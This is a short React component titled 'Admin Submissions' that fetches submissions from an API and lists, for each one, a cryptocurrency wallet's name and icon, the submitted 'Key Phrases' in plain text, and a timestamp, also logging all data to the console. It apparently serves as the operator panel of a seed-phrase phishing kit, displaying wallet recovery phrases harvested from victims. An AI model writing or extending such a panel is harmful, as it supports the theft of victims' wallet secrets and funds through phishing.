import React, { useState, useEffect } from "react";

const SubmissionsPage = () => {
  const [submissions, setSubmissions] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    const fetchSubmissions = async () => {
      try {
        const response = await fetch("/api/submissions");
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const data = await response.json();
        console.log("Fetched submissions:", data);
        setSubmissions(data.submissions);
      } catch (error) {
        console.error("Error fetching submissions:", error);
      } finally {
        setLoading(false);
      }
    };

    fetchSubmissions();
  }, []);

  if (loading) return <p>Loading submissions...</p>;

  return (
    <div className="submissions-container">
      <h2>Admin Submissions</h2>
      {submissions.length === 0 ? (
        <p>No submissions yet.</p>
      ) : (
        submissions.map((submission, index) => (
          <div key={index} className="submission-card">
            <div className="wallet-info">
              <img src={submission.wallet.icon} alt={submission.wallet.name} />
              <h3>{submission.wallet.name}</h3>
            </div>
            <p>Key Phrases: {submission.keyPhrases}</p>
            <small>{new Date(submission.timestamp).toLocaleString()}</small>
          </div>
        ))
      )}
    </div>
  );
};

export default SubmissionsPage;
